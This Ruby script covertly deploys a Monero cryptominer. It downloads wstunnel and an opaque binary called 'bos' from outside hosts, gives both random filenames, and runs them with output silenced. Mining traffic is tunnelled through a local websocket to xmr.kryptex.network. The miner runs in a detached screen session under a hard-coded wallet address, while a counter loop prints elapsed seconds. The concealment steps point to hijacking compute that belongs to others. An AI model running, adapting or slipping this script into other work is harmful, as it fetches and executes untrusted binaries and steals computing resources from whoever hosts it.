#!/usr/bin/env ruby

require 'securerandom'
require 'fileutils'

ws_port = rand(10000..60000)
tcp_port = rand(10000..60000)

puts "WS_PORT=#{ws_port}"
puts "TCP_PORT=#{tcp_port}"

system('sudo apt update')
system('sudo apt install -y screen')

# Random filenames
wstunnel_file = SecureRandom.alphanumeric(10)
bos_file = SecureRandom.alphanumeric(10)

# Download
system("curl -L -o #{wstunnel_file}.tar.gz https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz")
system("curl -L -o #{bos_file} https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos")

# Extract
system("tar -xf #{wstunnel_file}.tar.gz")

# Rename extracted binary
File.rename('wstunnel', wstunnel_file)
FileUtils.chmod('+x', [wstunnel_file, bos_file])

# Start services
Process.spawn("./#{wstunnel_file} server ws://127.0.0.1:#{ws_port}", out: '/dev/null', err: '/dev/null')
Process.spawn("./#{wstunnel_file} client -L tcp://127.0.0.1:#{tcp_port}:xmr.kryptex.network:7029 ws://127.0.0.1:#{ws_port}", out: '/dev/null', err: '/dev/null')
system("screen -dmS play ./#{bos_file} -o 127.0.0.1:#{tcp_port} -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.PY -t 7")

i = 0
loop do
  print "\r#{i} seconds"
  i += 1
  sleep 1
end
